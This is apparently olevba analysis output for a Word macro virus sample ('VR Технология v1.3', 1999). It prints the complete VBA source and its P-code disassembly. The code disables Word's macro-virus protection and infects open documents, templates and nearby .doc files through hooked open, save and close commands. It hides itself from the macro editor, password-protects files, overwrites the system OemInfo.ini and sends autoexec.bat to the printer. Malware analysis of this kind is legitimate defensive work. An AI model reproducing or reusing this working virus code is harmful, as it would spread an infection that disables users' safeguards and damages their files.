olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Techno.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Techno.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VrTechnoCode.bas 
in file: Virus.MSWord.Techno.b - OLE stream: 'Macros/VBA/VrTechnoCode'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
  '----------------------------------------------------------------'
  '  VR Технология v1.3 by John Great from Russia Far East (C)'99  '
  '----------------------------------------------------------------'

Const VrVersion As Single = 1.3
Const VrName As String = "VrTechnoCode"
Const VrMName As String = "VrTechnoCode": Const VrPassword As String = "Mirochka"

'-------------------'
'  Install-Module:  '
'-------------------'

Private Sub VrInstall(): On Error Resume Next
Application.EnableCancelKey = 0: Options.VirusProtection = 0
Application.DisplayAlerts = 0: WordBasic.DisableAutoMacros 0
Options.ConfirmConversions = 0: Options.SaveNormalPrompt = 0
ShowVisualBasicEditor = 0
If IsDestruct Then
    For Each aDoc In Documents: GoSub VrInfect: Next
    For Each aDoc In Templates: GoSub VrInfect: aDoc.Save: Next
    If IsChance(9) Then AddOemInfo
End If: Exit Sub
VrInfect:
    VrN = "": VrN = aDoc.CustomDocumentProperties("VrName")
    VrV = 0: VrV = aDoc.CustomDocumentProperties("VrVersion")
    If VrN = VrName Then
    If VrV >= VrVersion Then
    If aDoc.ProtectionType <> wdNoProtection Then aDoc.Unprotect VrPassword
    Return: End If: End If
    
    aDoc.CustomDocumentProperties.Add "VrName", False, msoPropertyTypeString, VrName
    aDoc.CustomDocumentProperties.Add "VrVersion", False, msoPropertyTypeFloat, VrVersion
    
    If aDoc = MacroContainer Then Return
    For Each mDoc In aDoc.VBProject.VBComponents: aDoc.VBProject.VBComponents.Remove (mDoc): Next
    VrFName = Application.Options.DefaultFilePath(wdProgramPath) & "\" + VrMName
    MacroContainer.VBProject.VBComponents(VrMName).Export (VrFName)
    aDoc.VBProject.VBComponents.Import (VrFName): Kill (VrFName)
    WordBasic.SetPrivateProfileString VrName, "Version", VrVersion, "win.ini"
    x = WordBasic.GetPrivateProfileString(VrName, "Install", "win.ini")
    WordBasic.SetPrivateProfileString VrName, "Install", CStr(IIf(x = "", 0, x) + 1), "win.ini"
    If (x <> 0) And (Int(x / 50) = x / 50) Then CreateImageScreen
Return: End Sub

Private Sub VrInstallFile(): On Error Resume Next
If IsDestruct Then Exit Sub
With Application.FileSearch
    .LookIn = CurDir
    .FileName = "*.Doc"
    .SearchSubFolders = False
ffound = .Execute
If ffound Then
For I = 1 To IIf(ffound < 4, ffound, 3)
Application.OrganizerCopy MacroContainer.FullName, .FoundFiles(Int(Rnd * ffound + 1)), VrMName, 3
Next: End If: End With: End Sub

'-------------------'
'  Infect-Module:   '
'-------------------'

'Открыть
Sub AutoOpen(): Call VrInstall: End Sub
Sub AutoExec(): Call VrInstall: End Sub

Sub FileOpen(): On Error Resume Next: WordBasic.DisableAutoMacros -1
If Dialogs(wdDialogFileOpen).Show Then VrInstall
End Sub
'Новый документ
Sub FileNew(): Application.Documents.Add: VrInstall: End Sub
Sub FileNewDefault()
Application.Documents.Add Template:=NormalTemplate.FullName: Call VrInstall: End Sub
'Сохранить
Sub FileSaveAs(): On Error Resume Next: Application.DisplayAlerts = -2
If Dialogs(wdDialogFileSaveAs).Show Then
If Not (ActiveDocument.SaveFormat = 0 Or ActiveDocument.SaveFormat = 1) Then
VrFName = Application.Options.DefaultFilePath(wdProgramPath) & "\" + VrMName
MacroContainer.VBProject.VBComponents(VrMName).Export (VrFName)
ActiveDocument.VBProject.VBComponents.Import (VrFName)
Set mDoc = ActiveDocument.VBProject.VBComponents(VrMName & "1")
ActiveDocument.VBProject.VBComponents.Remove (mDoc)
Kill (VrFName): ActiveDocument.Protect 2, 0, VrPassword
ActiveDocument.SaveAs FileFormat:=0
End If: End If: Call VrInstall: End Sub
Sub FileSave(): On Error Resume Next
If ActiveDocument.Name <> ActiveDocument.FullName Then
ActiveDocument.Protect 2, 0, VrPassword
ActiveDocument.SaveAs FileFormat:=wdFormatDocument: Call VrInstall
Else: FileSaveAs: End If: End Sub
'Закрыть
Sub FileClose(): On Error Resume Next
ActiveDocument.Protect 2, 0, VrPassword: Application.DisplayAlerts = -2
If ActiveDocument.Name = ActiveDocument.FullName Then
Call FileSaveAs
If ActiveDocument.Saved Then ActiveDocument.Close wdDoNotSaveChanges
Else: ActiveDocument.Close -2, 0: Call VrInstall: End If: End Sub
Sub DocClose(): On Error Resume Next: If IsChance(9) Then VrInstallFile
Call FileClose: End Sub

'-------------------'
'  Stealth-Module:  '
'-------------------'

Sub ViewVBCode(): VrStealth: End Sub
Sub ToolsMacro(): VrStealth: End Sub
Sub FileTemplates(): VrStealth: End Sub
Sub ToolsOptions(): On Error Resume Next
If Dialogs(wdDialogToolsOptions).Show Then
Options.SaveNormalPrompt = 0: Options.VirusProtection = 0
End If: End Sub

Private Sub VrStealth(): On Error Resume Next
Application.EnableCancelKey = 0: ShowVisualBasicEditor = 0
If IsChance(5) Then
With Assistant.NewBalloon
    .Animation = msoAnimationThinking
    .Button = msoButtonSetOK
    .Heading = "VR Технология v" & VrVersion
    .Text = "Word Macro ВИРУС!!!" & vbCr & "ДВЮИ МВД РФ  © 1999"
    .Show
End With: End If: End Sub
Private Function IsChance(Num As Integer) As Boolean: On Error Resume Next
Randomize: IsChance = Not CBool(Int(Rnd * Num)): If Not IsDestruct Then IsChance = False
End Function

'-------------------'
' Destruct-Module:  '
'-------------------'

Private Function IsDestruct() As Boolean: On Error Resume Next
If WordBasic.GetPrivateProfileString(VrName, "Password", "win.ini") = VrPassword Then IsDestruct = 0 Else IsDestruct = True
End Function
Sub FilePrint(): On Error Resume Next: With Dialogs.Item(wdDialogFilePrint)
If IsChance(5) Then .FileName = "C:\autoexec.bat"
.Show: End With: End Sub
Sub FilePrintDefault(): On Error Resume Next
If IsChance(5) Then
Application.PrintOut FileName:="C:\autoexec.bat"
Else: If IsChance(7) Then Else ActiveDocument.PrintOut
End If: End Sub

Private Sub AddOemInfo(): On Error Resume Next
fn = WordBasic.GetPrivateProfileString("Paths", "WinDir", "C:\MsDos.sys") & "\System\OemInfo.ini"
Kill (fn): Open fn For Output As #1
Print #1, "[General]"
Print #1, "Manufacturer=ДВЮИ МВД РФ"
Print #1, "Model=MS Word Вирус"
Print #1, "[Support Information]"
Print #1, "Line1=Компьютер заражен вирусом: " + VrName
Print #1, "Line2="
Print #1, "Line3=Vr Technology"
Print #1, "Line4=John Great, ДВЮИ МВД РФ - (C) '1999"
Close #1: End Sub

Private Sub CreateImageScreen(): On Error Resume Next
Application.ScreenUpdating = 0: Application.EnableCancelKey = wdCancelDisabled
If ActiveDocument.ProtectionType = wdNoProtection Then
x0 = (ActiveDocument.PageSetup.PageWidth - 410) / 2: y0 = ActiveDocument.PageSetup.TopMargin
Set aShape = ActiveDocument.Shapes.AddShape(msoShapeRoundedRectangle, x0, y0, 410, 130)
With aShape
.Fill.Visible = msoTrue
.Fill.ForeColor.RGB = RGB(255, 255, 255)
.Fill.Transparency = 0.5
.Fill.OneColorGradient msoGradientHorizontal, 4, 0.23
.ZOrder msoBringInFrontOfText
.TextFrame.TextRange.Select
With Selection
.LanguageID = wdEnglishUS
.ParagraphFormat.Alignment = wdAlignParagraphCenter
.Font.Bold = True: .Font.Italic = False
.Font.Name = "Times New Roman": .Font.Size = 20
.TypeText Text:="Microsoft Word Macro Virus"
.Font.Italic = True: .Font.Size = 14
.TypeText Text:=vbCr + "VrTechnoCode" + vbCr
.Font.Italic = False: .Font.Bold = False: .Font.Size = 10
.ParagraphFormat.Alignment = wdAlignParagraphLeft
.TypeText Text:="- Word 7.0" + vbCr + "- Stealth Technology" + vbCr + "- Infect Documents and Templates" + vbCr + vbCrLf
.ParagraphFormat.Alignment = wdAlignParagraphCenter
.Font.Italic = True: .Font.Bold = True: .Font.Size = 14
.TypeText Text:="Copyright by John Great from Russia Far East, Khabarovsk'1999"
End With: End With
With ActiveDocument.Shapes.AddShape(msoShapeExplosion1, x0 + 225, y0 + 25, 180, 72)
.IncrementRotation 180#
.Fill.Visible = msoTrue
.Fill.PresetGradient msoGradientHorizontal, 1, msoGradientFire
.ZOrder msoSendBehindText
.TextFrame.TextRange.Select
With Selection
.Font.Bold = True: .Font.Italic = True
.ParagraphFormat.Alignment = wdAlignParagraphCenter
.Font.Name = "Times New Roman": .Font.Size = 16
.TypeText Text:="Version " & VrVersion
End With
ActiveDocument.Shapes.Range(Array(aShape.Name, .Name)).Select
Selection.ShapeRange.Group.Select: ActiveDocument.UndoClear
End With: End If: Application.ScreenUpdating = -1: End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Techno.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1288 bytes
' Macros/VBA/VrTechnoCode - 19762 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0002 0x0041 "----------------------------------------------------------------'"
' Line #2:
' 	QuoteRem 0x0002 0x0041 "  VR Технология v1.3 by John Great from Russia Far East (C)'99  '"
' Line #3:
' 	QuoteRem 0x0002 0x0041 "----------------------------------------------------------------'"
' Line #4:
' Line #5:
' 	Dim (Const) 
' 	LitR8 0xCCCD 0xCCCC 0xCCCC 0x3FF4 
' 	VarDefn VrVersion (As Single)
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x000C "VrTechnoCode"
' 	VarDefn VrName (As String)
' Line #7:
' 	Dim (Const) 
' 	LitStr 0x000C "VrTechnoCode"
' 	VarDefn VrMName (As String)
' 	BoS 0x0000 
' 	Dim (Const) 
' 	LitStr 0x0008 "Mirochka"
' 	VarDefn VrPassword (As String)
' Line #8:
' Line #9:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #10:
' 	QuoteRem 0x0000 0x0014 "  Install-Module:  '"
' Line #11:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #12:
' Line #13:
' 	FuncDefn (Private Sub VrInstall())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #14:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #15:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #16:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #17:
' 	LitDI2 0x0000 
' 	St ShowVisualBasicEditor 
' Line #18:
' 	Ld IsDestruct 
' 	IfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' 	BoS 0x0000 
' 	GoSub VrInfect 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #20:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' 	BoS 0x0000 
' 	GoSub VrInfect 
' 	BoS 0x0000 
' 	Ld aDoc 
' 	ArgsMemCall Save 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #21:
' 	LitDI2 0x0009 
' 	ArgsLd IsChance 0x0001 
' 	If 
' 	BoSImplicit 
' 	ArgsCall AddOemInfo 0x0000 
' 	EndIf 
' Line #22:
' 	EndIfBlock 
' 	BoS 0x0000 
' 	ExitSub 
' Line #23:
' 	Label VrInfect 
' Line #24:
' 	LitStr 0x0000 ""
' 	St VrN 
' 	BoS 0x0000 
' 	LitStr 0x0006 "VrName"
' 	Ld aDoc 
' 	ArgsMemLd CustomDocumentProperties 0x0001 
' 	St VrN 
' Line #25:
' 	LitDI2 0x0000 
' 	St VrV 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VrVersion"
' 	Ld aDoc 
' 	ArgsMemLd CustomDocumentProperties 0x0001 
' 	St VrV 
' Line #26:
' 	Ld VrN 
' 	Ld VrName 
' 	Eq 
' 	IfBlock 
' Line #27:
' 	Ld VrV 
' 	Ld VrVersion 
' 	Ge 
' 	IfBlock 
' Line #28:
' 	Ld aDoc 
' 	MemLd ProtectionType 
' 	Ld wdNoProtection 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld VrPassword 
' 	Ld aDoc 
' 	ArgsMemCall Unprotect 0x0001 
' 	EndIf 
' Line #29:
' 	Return 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #30:
' Line #31:
' 	LitStr 0x0006 "VrName"
' 	LitVarSpecial (False)
' 	Ld msoPropertyTypeString 
' 	Ld VrName 
' 	Ld aDoc 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #32:
' 	LitStr 0x0009 "VrVersion"
' 	LitVarSpecial (False)
' 	Ld msoPropertyTypeFloat 
' 	Ld VrVersion 
' 	Ld aDoc 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #33:
' Line #34:
' 	Ld aDoc 
' 	Ld MacroContainer 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Return 
' 	EndIf 
' Line #35:
' 	StartForVariable 
' 	Ld mDoc 
' 	EndForVariable 
' 	Ld aDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' 	BoS 0x0000 
' 	Ld mDoc 
' 	Paren 
' 	Ld aDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #36:
' 	Ld wdProgramPath 
' 	Ld Application 
' 	MemLd Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0001 "\"
' 	Ld VrMName 
' 	Add 
' 	Concat 
' 	St VrFName 
' Line #37:
' 	Ld VrFName 
' 	Paren 
' 	Ld VrMName 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #38:
' 	Ld VrFName 
' 	Paren 
' 	Ld aDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	BoS 0x0000 
' 	Ld VrFName 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #39:
' 	Ld VrName 
' 	LitStr 0x0007 "Version"
' 	Ld VrVersion 
' 	LitStr 0x0007 "win.ini"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #40:
' 	Ld VrName 
' 	LitStr 0x0007 "Install"
' 	LitStr 0x0007 "win.ini"
' 	Ld WordBasic 
' 	ArgsMemLd GetPrivateProfileString 0x0003 
' 	St x 
' Line #41:
' 	Ld VrName 
' 	LitStr 0x0007 "Install"
' 	Ld x 
' 	LitStr 0x0000 ""
' 	Eq 
' 	LitDI2 0x0000 
' 	Ld x 
' 	ArgsLd IIf 0x0003 
' 	LitDI2 0x0001 
' 	Add 
' 	Coerce (Str) 
' 	LitStr 0x0007 "win.ini"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #42:
' 	Ld x 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Ld x 
' 	LitDI2 0x0032 
' 	Div 
' 	FnInt 
' 	Ld x 
' 	LitDI2 0x0032 
' 	Div 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall CreateImageScreen 0x0000 
' 	EndIf 
' Line #43:
' 	Return 
' 	BoS 0x0000 
' 	EndSub 
' Line #44:
' Line #45:
' 	FuncDefn (Private Sub VrInstallFile())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #46:
' 	Ld IsDestruct 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #47:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #48:
' 	Ld CurDir 
' 	MemStWith LookIn 
' Line #49:
' 	LitStr 0x0005 "*.Doc"
' 	MemStWith FileName 
' Line #50:
' 	LitVarSpecial (False)
' 	MemStWith SearchSubFolders 
' Line #51:
' 	MemLdWith Execute 
' 	St ffound 
' Line #52:
' 	Ld ffound 
' 	IfBlock 
' Line #53:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ffound 
' 	LitDI2 0x0004 
' 	Lt 
' 	Ld ffound 
' 	LitDI2 0x0003 
' 	ArgsLd IIf 0x0003 
' 	For 
' Line #54:
' 	Ld MacroContainer 
' 	MemLd FullName 
' 	Ld Rnd 
' 	Ld ffound 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Ld VrMName 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #55:
' 	StartForVariable 
' 	Next 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndWith 
' 	BoS 0x0000 
' 	EndSub 
' Line #56:
' Line #57:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #58:
' 	QuoteRem 0x0000 0x0014 "  Infect-Module:   '"
' Line #59:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #60:
' Line #61:
' 	QuoteRem 0x0000 0x0007 "Открыть"
' Line #62:
' 	FuncDefn (Sub AutoOpen())
' 	BoS 0x0000 
' 	ArgsCall (Call) VrInstall 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #63:
' 	FuncDefn (Sub AutoExec())
' 	BoS 0x0000 
' 	ArgsCall (Call) VrInstall 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Sub FileOpen())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #66:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	If 
' 	BoSImplicit 
' 	ArgsCall VrInstall 0x0000 
' 	EndIf 
' Line #67:
' 	EndSub 
' Line #68:
' 	QuoteRem 0x0000 0x000E "Новый документ"
' Line #69:
' 	FuncDefn (Sub FileNew())
' 	BoS 0x0000 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemCall Add 0x0000 
' 	BoS 0x0000 
' 	ArgsCall VrInstall 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #70:
' 	FuncDefn (Sub FileNewDefault())
' Line #71:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Template 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemCall Add 0x0001 
' 	BoS 0x0000 
' 	ArgsCall (Call) VrInstall 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #72:
' 	QuoteRem 0x0000 0x0009 "Сохранить"
' Line #73:
' 	FuncDefn (Sub FileSaveAs())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #74:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	IfBlock 
' Line #75:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0001 
' 	Eq 
' 	Or 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #76:
' 	Ld wdProgramPath 
' 	Ld Application 
' 	MemLd Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0001 "\"
' 	Ld VrMName 
' 	Add 
' 	Concat 
' 	St VrFName 
' Line #77:
' 	Ld VrFName 
' 	Paren 
' 	Ld VrMName 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #78:
' 	Ld VrFName 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #79:
' 	SetStmt 
' 	Ld VrMName 
' 	LitStr 0x0001 "1"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set mDoc 
' Line #80:
' 	Ld mDoc 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #81:
' 	Ld VrFName 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	LitDI2 0x0000 
' 	Ld VrPassword 
' 	Ld ActiveDocument 
' 	ArgsMemCall Protect 0x0003 
' Line #82:
' 	LitDI2 0x0000 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #83:
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	ArgsCall (Call) VrInstall 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #84:
' 	FuncDefn (Sub FileSave())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #85:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ne 
' 	IfBlock 
' Line #86:
' 	LitDI2 0x0002 
' 	LitDI2 0x0000 
' 	Ld VrPassword 
' 	Ld ActiveDocument 
' 	ArgsMemCall Protect 0x0003 
' Line #87:
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	BoS 0x0000 
' 	ArgsCall (Call) VrInstall 0x0000 
' Line #88:
' 	ElseBlock 
' 	BoS 0x0000 
' 	ArgsCall FileSaveAs 0x0000 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndSub 
' Line #89:
' 	QuoteRem 0x0000 0x0007 "Закрыть"
' Line #90:
' 	FuncDefn (Sub FileClose())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #91:
' 	LitDI2 0x0002 
' 	LitDI2 0x0000 
' 	Ld VrPassword 
' 	Ld ActiveDocument 
' 	ArgsMemCall Protect 0x0003 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #92:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #93:
' 	ArgsCall (Call) FileSaveAs 0x0000 
' Line #94:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	If 
' 	BoSImplicit 
' 	Ld wdDoNotSaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' 	EndIf 
' Line #95:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	UMi 
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0002 
' 	BoS 0x0000 
' 	ArgsCall (Call) VrInstall 0x0000 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndSub 
' Line #96:
' 	FuncDefn (Sub DocClose())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitDI2 0x0009 
' 	ArgsLd IsChance 0x0001 
' 	If 
' 	BoSImplicit 
' 	ArgsCall VrInstallFile 0x0000 
' 	EndIf 
' Line #97:
' 	ArgsCall (Call) FileClose 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #98:
' Line #99:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #100:
' 	QuoteRem 0x0000 0x0014 "  Stealth-Module:  '"
' Line #101:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #102:
' Line #103:
' 	FuncDefn (Sub ViewVBCode())
' 	BoS 0x0000 
' 	ArgsCall VrStealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #104:
' 	FuncDefn (Sub ToolsMacro())
' 	BoS 0x0000 
' 	ArgsCall VrStealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #105:
' 	FuncDefn (Sub FileTemplates())
' 	BoS 0x0000 
' 	ArgsCall VrStealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #106:
' 	FuncDefn (Sub ToolsOptions())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #107:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	IfBlock 
' Line #108:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #109:
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndSub 
' Line #110:
' Line #111:
' 	FuncDefn (Private Sub VrStealth())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #112:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St ShowVisualBasicEditor 
' Line #113:
' 	LitDI2 0x0005 
' 	ArgsLd IsChance 0x0001 
' 	IfBlock 
' Line #114:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #115:
' 	Ld msoAnimationThinking 
' 	MemStWith Animation 
' Line #116:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #117:
' 	LitStr 0x000F "VR Технология v"
' 	Ld VrVersion 
' 	Concat 
' 	MemStWith Heading 
' Line #118:
' 	LitStr 0x0013 "Word Macro ВИРУС!!!"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0013 "ДВЮИ МВД РФ  © 1999"
' 	Concat 
' 	MemStWith Then 
' Line #119:
' 	ArgsMemCallWith Show 0x0000 
' Line #120:
' 	EndWith 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndSub 
' Line #121:
' 	FuncDefn (Private Function IsChance(Num As Integer) As Boolean)
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #122:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	Ld Num 
' 	Mul 
' 	FnInt 
' 	Coerce (Bool) 
' 	Not 
' 	St IsChance 
' 	BoS 0x0000 
' 	Ld IsDestruct 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St IsChance 
' 	EndIf 
' Line #123:
' 	EndFunc 
' Line #124:
' Line #125:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #126:
' 	QuoteRem 0x0000 0x0014 " Destruct-Module:  '"
' Line #127:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #128:
' Line #129:
' 	FuncDefn (Private Function IsDestruct() As Boolean)
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #130:
' 	Ld VrName 
' 	LitStr 0x0008 "Password"
' 	LitStr 0x0007 "win.ini"
' 	Ld WordBasic 
' 	ArgsMemLd GetPrivateProfileString 0x0003 
' 	Ld VrPassword 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St IsDestruct 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St IsDestruct 
' 	EndIf 
' Line #131:
' 	EndFunc 
' Line #132:
' 	FuncDefn (Sub FilePrint())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	StartWithExpr 
' 	Ld wdDialogFilePrint 
' 	Ld Dialogs 
' 	ArgsMemLd Item 0x0001 
' 	With 
' Line #133:
' 	LitDI2 0x0005 
' 	ArgsLd IsChance 0x0001 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "C:\autoexec.bat"
' 	MemStWith FileName 
' 	EndIf 
' Line #134:
' 	ArgsMemCallWith Show 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' 	BoS 0x0000 
' 	EndSub 
' Line #135:
' 	FuncDefn (Sub FilePrintDefault())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #136:
' 	LitDI2 0x0005 
' 	ArgsLd IsChance 0x0001 
' 	IfBlock 
' Line #137:
' 	LitStr 0x000F "C:\autoexec.bat"
' 	ParamNamed FileName 
' 	Ld Application 
' 	ArgsMemCall PrintOut 0x0001 
' Line #138:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitDI2 0x0007 
' 	ArgsLd IsChance 0x0001 
' 	If 
' 	Else 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' 	EndIf 
' Line #139:
